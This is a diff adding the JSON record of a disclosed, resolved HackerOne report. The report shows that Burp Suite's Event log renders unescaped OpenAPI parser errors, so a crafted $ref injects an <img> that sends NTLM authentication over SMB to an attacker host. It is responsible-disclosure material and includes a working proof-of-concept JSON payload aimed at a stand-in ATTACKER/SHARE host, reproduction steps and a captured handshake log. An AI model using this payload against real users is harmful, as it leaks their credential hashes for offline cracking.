@@ -1,0 +1,132 @@
+{
+  "id": 3972558,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTcyNTU4",
+  "url": "https://hackerone.com/reports/3972558",
+  "title": "Burp Suite OpenAPI Event Log HTML injection triggers Windows SMB authentication",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-08-27T01:09:46.448Z",
+  "submitted_at": "2026-08-27T01:09:46.764Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gankd",
+    "url": "/gankd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/q4a36ja7xgqm9v7vgijv6ahn9tbf/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15252,
+    "url": "https://hackerone.com/portswigger",
+    "handle": "portswigger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "PortSwigger Web Security",
+      "twitter_handle": "Burp_Suite",
+      "website": "https://portswigger.net",
+      "about": "Burp Suite is the leading software for web security testing"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-29416"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-15T14:08:30.663Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-10-13T14:00:40.635Z",
+  "team_member_agreed_on_going_public_at": "2026-10-15T14:08:29.887Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nBurp Suite 2026.8 build 53343 inserts attacker-controlled text from an OpenAPI parser exception into the Event log HTML without encoding it. After the user invokes **Response → Save OpenAPI requests to site map** and selects the resulting Event log row, Swing's `HTMLEditorKit` interprets an injected `<img>` tag. On Windows, a UNC-backed `file:` URL causes the Burp process to authenticate to an attacker-controlled SMB endpoint.\n\nI confirmed the full chain in a controlled Windows 11 environment: NTLM Type 1/2/3 exchange, successful SMB session setup, connection to the selected share, and reads of the selected file. This is not automatic when the response is received; it requires the two UI actions described below.\n\n### Affected version\n\n- Burp Suite Professional/Community 2026.8 Early Adopter, build 53343.\n- Tested artifact: official Windows ARM64 installer `burpsuite_windows-arm64_v2026_8.exe`.\n- Installer SHA-256: `cda0916433c696eec59c5650c15bc59fdcc4fe1bc04e744f4612653f7b7ea05f`.\n- Extracted `burpsuite.jar` SHA-256: `1c42cdc7f38f2fb3486a15e1c5212763f81e6e4bc6059776025dd2c093cf94e1`.\n- Bundled runtime used for testing: Microsoft OpenJDK `25.0.4+7-LTS`, Windows ARM64.\n- Release page: https://portswigger.net/burp/releases/professional-community-2026-8\n\n### Proof of concept\n\nServe the following response with HTTP status `200` and `Content-Type: application/json`. Replace `ATTACKER` and `SHARE` with an SMB endpoint and share under your control.\n\n```json\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\"title\": \"t\", \"version\": \"1\"},\n  \"servers\": [{\"url\": \"http://127.0.0.1:9\"}],\n  \"paths\": {\n    \"/x\": {\n      \"post\": {\n        \"requestBody\": {\n          \"content\": {\n            \"application/json\": {\n              \"schema\": {\n                \"$ref\": \"#/components/schemas/http://127.0.0.1:1/><img&#32;src=file:////ATTACKER/SHARE/image.gif>\"\n              }\n            }\n          }\n        },\n        \"responses\": {\"200\": {\"description\": \"ok\"}}\n      }\n    }\n  }\n}\n```\n\nThe `&#32;` entity is required. A literal space is truncated at this parser-error location, while Swing decodes `&#32;` as the whitespace between the `img` tag name and its `src` attribute.\n\n{F6561285}\n\n### Reproduction steps\n\n1. Start a fresh temporary Burp project on Windows and a controlled SMB listener reachable from that machine.\n2. Send a request in Repeater to an endpoint returning the response above.\n3. Right-click the Repeater **Response** editor and select **Save OpenAPI requests to site map**.\n4. Open **Dashboard → Event log**.\n5. Select the new Scanner/Error row for the API-definition parsing failure.\n6. Observe the Burp process authenticate to `ATTACKER`, connect to `SHARE`, and request `image.gif`.\n\nUsing a fresh project avoids Event log deduplication suppressing an equivalent recent event.\n\n### Observed result\n\nThe controlled live run produced the following sequence:\n\n```text\nWindows -> listener: NTLM Type 1\nlistener -> Windows: NTLM Type 2 challenge\nWindows -> listener: NTLM Type 3, domain=HAKAI, user=burppoc\nlistener -> Windows: SMB2 Session Setup STATUS_SUCCESS\nlistener -> Windows: SMB2 Tree Connect STATUS_SUCCESS\nWindows -> listener: Create/Read POCSHARE\\swing-image.gif\n```\n\nThe listener returned the exact seven-byte fixture `GIF89a\\n`. The bytes read from the SMB response had SHA-256 `3cf815fc3053dafe38db36ef0977b9d027a43bc1ed0d4c5377aa580378bc57f6`, matching the predeclared file. The Type 3 material is omitted from the report.\n\nAn independent fresh Windows boot using the same product classes, runtime, synthetic credential, and escaped HTML control produced zero `AUTHENTICATE_MESSAGE`, `TreeConnect`, `Create`, or `Read` events. Hashcat mode 5600, with the potfile disabled and only the predeclared synthetic password as a candidate, verified that the positive capture was a valid NetNTLMv2 challenge-response for the controlled account.\n\n### Root cause\n\nThe build-53343 data flow is:\n\n```text\nattacker-controlled Repeater response\n  -> OpenAPI validation and full parsing\n  -> raw ApiDefinitionException.getMessage()\n  -> raw Event log detail\n  -> Event log HTML StringBuilder\n  -> JEditorPane.setText()\n  -> Swing ImageView\n  -> Windows file/UNC resolution\n  -> SMB authentication\n```\n\nThe lightweight OpenAPI gate accepts the response as version `3.0.0`. Full parsing rejects the crafted `$ref` and creates this exception detail:\n\n```text\nBlocking URL resolution for 'http://127.0.0.1:1/><img&#32;src=file:////ATTACKER/SHARE/image.gif>'.\n```\n\n`Zfk4.Ze` passes the raw `ApiDefinitionException.getMessage()` value to the Event log builder. `Zg3w.ZD(false)` appends that detail directly to an HTML `StringBuilder`, and `Zwlk.setText()` renders it as `text/html`. The custom `HTMLEditorKit` view factory replaces paragraph handling but delegates image elements to Swing's standard `ImageView`, which resolves the UNC-backed resource.\n\n### Relationship to report #1054382 / CVE-2021-29416\n\nPublic report #1054382 documented the same broad Swing HTML/resource-loading class and Windows credential impact. This report is a current mitigation bypass/regression with a distinct source and viewer: a gate-valid OpenAPI response becomes raw `ApiDefinitionException` detail in the Event log `JEditorPane`. The path remains reachable in official build 53343.\n\nHistorical report: https://hackerone.com/reports/1054382\n\n### Preconditions and scope\n\n- The user must invoke **Save OpenAPI requests to site map** and then select the resulting Event log row.\n- The victim must be on Windows, able to reach the SMB endpoint, and have a credential applicable to that target.\n- Outbound SMB or NTLM policy may prevent authentication.\n- Proxying, crawling, passive scanning, and active scanning are not claimed as trigger paths.\n- I do not claim plaintext password disclosure, a reusable NT hash, relay, RCE, or universal impact across every Windows configuration.\n\nAll testing used owned systems, a read-only controlled share, and synthetic credentials. No third-party credential, host, project, or customer data was accessed.\n\n## Remediation\n\n1. HTML-encode every dynamic Event log value at the final rendering boundary, including `&`, `<`, `>`, quotes, and apostrophes.\n2. Disable or replace `ImageView` and any other external-resource view in the Event log `HTMLEditorKit`; Event details should never initiate network or file access.\n3. Add regression tests covering entity whitespace and `http:`, `file:`, and UNC-backed resource URLs.\n\n## Impact\n\nAn attacker controlling an API response can turn a plausible Burp API-import workflow into outbound SMB authentication from the Windows account running Burp. This exposes a NetNTLMv2 challenge-response to the attacker-controlled listener, where it can be subjected to offline password guessing. The controlled test also demonstrated attacker-directed access to the selected SMB share and file path.\n\nI assess this as **Medium** because exploitation requires two explicit UI actions, depends on Windows/network credential-release policy, and may be affected by Event log deduplication. No password recovery, reusable NT hash, relay, code execution, or lateral movement is claimed.",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6561285,
+      "file_name": "0826_(1).mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/n353tjt758d4b7qf1372nxfhebnl?response-content-disposition=attachment%3B%20filename%3D%220826_%25281%2529.mp4%22%3B%20filename%2A%3DUTF-8%27%270826_%25281%2529.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7TR7FALG%2F20261015%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261015T152708Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAYaCXVzLXdlc3QtMiJHMEUCIF46WPvxtq2%2B3b1wiNjyjSYLCmkH1ubx19zpNWN5WfI0AiEAljCTXCwvpwVv3TtMaL10zCEhA3OBugC%2F5sLiXpMOmHIquwUIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFELM7KS3zU9iVJOXCqPBchGdjAXrglZfpo6mzvNQbKXHaecDe5RV44QoTnrX5K0xHdXKY7Qkxv%2FfECea19muIvbpkEtYUXCN7imnpp%2BhcvHvRkwo8QUPPDPw4aPuPzIeWeCKgpiqSwrA1SCoFZY%2FR%2FiWm0pc9HFAcrN1D7kiGqULM81mGGvGyqwIkHQZNL5jTUCkEyzePG5U7dIT9AqhEYUdCF0VnUHIFw3zvous7iKo7Xl62N5Ztza3Mm5qtF%2F1q6UVKFGCcwP0ZdHTvvoMRXa2FbDYBI2OLJfY5urBUXpQyOAFdGG4XFve1uqCsQwbjO52pJbmNFIE62f9JVEfzG2%2FvCCMvBg%2F2y4LLtFbDSXdjjQZg839qLL%2FhxEXLMoBYERCi5PAQxe9dWxTIjY7XlbqRhgP%2BITzt2rps0fr%2FB2KBrlWyFDIqzvrPSB03kP9yxghLUn8VG%2BhpNQvq8Tpah0U8dYs%2FDKwzWiS1HBZc4KCNKUQiO618gfx5k2%2Fg6ITMh328Nrh87Er7qr6vRzcmIasL4l0DUXHM39JVAbu3Uk3n5%2Fx6%2FCMBuXwkrhoXWtnTovwwVG1yM%2BrmCrcWfFPqbVHlEfwSotEiFbvTfDJ89QF%2BX3oP7bDEZcKoup9XJxRMGBLExTsWZMLMzsuKCeiZpho5YzfxBgky3Nq7wHxJHYKuaWiDCxsNubtPR7CD8A4n51j%2FEhd9r6GhFa7hLTMewx9t4YO8sl26bY6DDEx0KyUJtiztnZInFK%2Bk3xdHel5ZFLgDuyRZhzL7X4elHox4lG2TQ7OuRlfQaBPmeRaFC5N5tbTaVLufB5EmjpJiyj7Q1f5luTraFVrwt%2BOiuRzjDHBd3LHRTxyJVScIM3Re0iEfCGeqBnnMFM4Bvm3LkwvrjD1gY6sQGOh5JiLtuIfDpRkU1M%2BcAUustKm4qnJtf6niWby1ka%2BhnwpPcNWK2BaEEb9Z3ldBGwGhp04kfp%2FW2HYmwXq9IEK0xLVM19fNTmtRxee%2FK6tKukPt%2FFoEis9nYX5r1GhHeb90s7wz6JDcg2SpV%2F6C%2FzwJfPaqLWcvrQFpyIgz0QhghZppgc9Ond99ypizMrwfW2Bmo5IfQ5EX0dYbc7%2FzHkZZrsEtdProQk1eIFBkl5fF0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48b83df9b50a0226f116eac608dcc3aee5c50a18e05294837d08594da92b1e06",
+      "file_size": 14810939,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-11-12T14:00:40.750Z",
+  "allow_singular_disclosure_after": 2414012.486396815,
+  "singular_disclosure_allowed": false,
+  "vote_count": 9,
+  "voters": [
+    "n1m0",
+    "kymu_",
+    "gankd",
+    "kujibiki",
+    "lolidkmyname",
+    "rahmi",
+    "2026",
+    "audion",
+    "gabrie0x6c"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 169,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Burp Suite Pro/Community",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
